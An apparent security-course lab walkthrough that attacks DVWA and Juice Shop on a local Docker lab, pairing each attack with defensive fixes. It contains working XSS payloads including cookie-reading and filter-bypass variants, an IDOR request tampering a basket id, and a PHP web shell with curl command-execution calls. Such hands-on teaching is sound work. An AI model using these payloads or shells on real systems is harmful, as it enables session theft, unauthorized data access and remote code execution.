# Module 14 — Hacking Web Applications · Guided Lab Walkthrough

> Step-by-step against **your own Docker lab** ([`../../labs/docker-compose.yml`](../../labs/docker-compose.yml)) — never a site you don't own. Everything below runs on `localhost`. Each step gives the payload/command, what you should see, an observation, a collapsible hint, and the defender/PAM takeaway. Outputs are **representative**.

**Goal:** land XSS by hand (reflected then stored), abuse an IDOR to reach another user's data, then upload a web shell for RCE — and watch each fix shut the attack down. SQL injection has its own drill in [Module 15](../15-sql-injection/lab-walkthrough.md).

**Run everything behind an intercepting proxy.** Point your browser at **Burp Suite** or **OWASP ZAP** (`http://127.0.0.1:8080`) so every request lands in the proxy history. The proxy is where you *understand*; automation only confirms.

**Targets:**
- **DVWA** at `http://localhost:8081` — pages *XSS (Reflected)*, *XSS (Stored)*, *File Upload*. Grab your `PHPSESSID` and `security` cookies (DevTools → Application → Cookies).
- **Juice Shop** at `http://localhost:8082` — modern SPA/API app for the IDOR drill.

---

## Part A — Cross-site scripting: reflected, then stored (DVWA)

Set **DVWA Security = Low** to start.

### A1. Reflected XSS on Low
On the *XSS (Reflected)* page, in the **What's your name?** box submit:
```html
<script>alert(document.domain)</script>
```
**You should see:** a JavaScript alert box popping the site's domain (`localhost`).

**Observe:** your input was echoed back into the HTML **unencoded** and the browser executed it. The payload was never stored — it only fired because *this request* carried it.

<details><summary>Hint</summary>If nothing pops, confirm the security level is **Low** and that your proxy isn't stripping the response. View the page source and find your `<script>` reflected verbatim between the HTML.</details>

**Defender/PAM view:** the fix is **context-aware output encoding + a CSP**, not input filtering. `HttpOnly` + `SameSite` cookies blunt the session-theft payoff.

### A2. Escalate to Medium (defeat the naive filter)
Raise **DVWA Security = Medium**. Retry the A1 payload — it is now stripped (the code does a `str_replace('<script>', '', ...)`). Bypass it with a non-`<script>` vector:
```html
"><img src=x onerror=alert(document.domain)>
```
or a case/tag trick:
```html
<ScRiPt>alert(1)</ScRiPt>
```
**You should see:** the alert fire again despite the "filter."

**Observe:** the Medium code blocklists the exact string `<script>` — an **event-handler** payload (`onerror`) or a case variation sails straight past. This is exactly why **blocklists are not an XSS control.**

<details><summary>Hint</summary>Think about *where* your input lands. If it lands inside an attribute, break out first with `">`; if it lands in the HTML body, an `<img onerror=...>` needs no `<script>` tag at all.</details>

**Defender/PAM view:** compare DVWA's **View Source** for Low vs Impossible — Impossible uses `htmlspecialchars()` (proper output encoding). That is the real fix; the Medium blocklist is a false sense of security.

### A3. Stored XSS (persistent) on the guestbook
Set **DVWA Security = Low**. On the *XSS (Stored)* page, in the **Message** box submit:
```html
<script>alert(document.cookie)</script>
```
(If the field length is capped, remove the `maxlength` attribute via DevTools, or use `<img src=x onerror=alert(document.cookie)>`.)

**You should see:** the alert fire **immediately** — and again **every time the page is reloaded**, including in a **second browser / incognito session**.

**Observe:** the payload is saved **server-side** in the guestbook, so it executes for **every** visitor with **no crafted link** required. That "hits every viewer" property is what makes stored XSS the most dangerous flavor.

<details><summary>Hint</summary>Open the page in a separate incognito window to prove persistence — if the alert fires there too, you have confirmed it is *stored*, not reflected.</details>

**Defender/PAM view:** stored XSS in an admin panel can hijack a privileged session. Protect privileged web consoles with **CyberArk Secure Web Sessions** (isolate + record), and set `HttpOnly` so `document.cookie` can't read the session token.

---

## Part B — IDOR / broken access control (Juice Shop)

Juice Shop assigns each user a numeric **basket id** and exposes it via its API. We'll view our own basket, then tamper the id to reach another user's.

### B1. Register and capture your own basket request
Register/log in at `http://localhost:8082`, add an item to the basket, then open your proxy history (or DevTools → Network). Find the API call:
```
GET /rest/basket/<your_id>
```
**You should see:** a JSON response containing **your** basket contents and your `BasketId`.

**Observe:** the basket is referenced by a small, **predictable integer**. That's the setup for an IDOR.

<details><summary>Hint</summary>In Juice Shop the token is a JWT in the `Authorization: Bearer ...` header. Keep that header when you replay — you stay authenticated as *you*, which is the whole point of an IDOR (authorized user, unauthorized object).</details>

### B2. Tamper the id to reach another basket
Send the request to **Repeater** and change the id (e.g. `2` → `1`):
```
GET /rest/basket/1
Authorization: Bearer <your token>
```
**You should see:** a **200 OK** returning a **different user's** basket — not yours.

**Observe:** you kept *your* valid session yet read *another* user's object. The server checked *authentication* ("are you logged in?") but not **authorization** ("is this object yours?"). That is textbook **IDOR = Broken Access Control (OWASP A01)**.

<details><summary>Hint</summary>If you get a 401/error, your JWT expired — re-log and copy a fresh `Authorization` header. Try adjacent ids; low integers (1, 2, 3) usually belong to seeded/admin accounts.</details>

**Defender/PAM view:** the durable fix is a **server-side, per-object authorization check** ("does this basket belong to the caller?") with **deny-by-default** — never rely on the id being hard to guess.

---

## Part C — Unrestricted file upload → web shell (DVWA)

Set **DVWA Security = Low**. Target the *File Upload* page.

### C1. Craft and upload a web shell
Create a one-line PHP shell locally:
```php
<?php system($_GET['c']); ?>
```
Save it as `shell.php` and upload it through the *File Upload* form.

**You should see:** a success message revealing the path, e.g.
```
../../hackable/uploads/shell.php successfully uploaded!
```
**Observe:** the app accepted a **`.php`** file with **no server-side type/extension check** and stored it in a **web-served, executable** directory. That combination is what makes an upload "unrestricted."

<details><summary>Hint</summary>The uploaded file lands under `hackable/uploads/`. Note the exact relative path DVWA prints — you need it to reach the shell in the next step.</details>

### C2. Execute commands through the shell
Browse to (or `curl`) the uploaded file with a command in the `c` parameter:
```bash
curl "http://localhost:8081/hackable/uploads/shell.php?c=id"
curl "http://localhost:8081/hackable/uploads/shell.php?c=uname%20-a"
```
**You should see:** the raw output of `id` / `uname -a` — i.e. **remote command execution** as the web-server user (`www-data`).

**Observe:** an unrestricted upload became a **web shell → RCE**. Everything the web process can touch is now reachable by the attacker.

<details><summary>Hint</summary>If you get a `403`/`404`, the path is wrong or the server won't execute PHP in that dir — recheck the printed upload path and URL-encode spaces (`%20`) in your command.</details>

**Defender/PAM view:** this is why the web tier must run as a **least-privilege service account** — a shell then inherits `www-data`, not admin, and finds **no reusable credentials** on the box. Pull DB/API secrets at runtime via **CyberArk CCP/Conjur** so an LFI or web shell finds nothing in `web.config`.

### C3. Watch the fix work
Raise **DVWA Security** to **High** (or **Impossible**) and re-upload `shell.php`.

**You should see:** the upload **rejected** — DVWA now checks the MIME type / extension server-side and only accepts real images:
```
Your image was not uploaded. We can only accept JPEG or PNG images.
```
**Observe:** server-side validation (allow-list of real image types, checking magic bytes, not just the extension) blocks the shell. Storing uploads **off the web root** and **disabling execution** in the upload directory are the complementary controls.

<details><summary>Hint</summary>Open **View Source** for Low vs High vs Impossible and compare — High adds `getimagesize()` and extension checks; Impossible re-encodes the image, destroying any embedded payload.</details>

**Defender/PAM view:** the fix is **server-side validation + uploads off the web root + no execute permission**, backed by a least-privilege app identity so even a bypass yields little.

---

## What you should conclude
| Step | What went wrong | Real-world defense |
|---|---|---|
| Reflected XSS fired | Output not encoded | Context-aware output encoding + CSP |
| Medium "filter" bypassed | Blocklist instead of encoding | Encode on output; never rely on a blocklist |
| Stored XSS hit every viewer | Persistent unencoded input | Encode output; `HttpOnly`/`SameSite`; Secure Web Sessions for admin consoles |
| IDOR read another basket | Authn checked, not authz | Per-object authorization checks, deny-by-default |
| Web shell → RCE | Unrestricted upload + execute | Validate type server-side, store off web root, no exec; least-priv app account |
| Upload blocked on High | Server-side validation | The control working — plus CCP/Conjur so no secrets to steal |

## Cleanup
```bash
# DVWA: delete the uploaded shell and clear the guestbook, or use "Setup / Reset DB".
# Juice Shop: nothing persistent created; restart the container to reset state if desired.
docker compose restart juice-shop   # optional, from labs/
```
Remove any local `shell.php` you created and reset all DVWA security levels.

## Record it
Log the payloads, the Low-vs-Medium-vs-High source differences, and the IDOR request/response in the **My lab log** table in [README.md](README.md); note misses in [PROGRESS.md](../../PROGRESS.md).
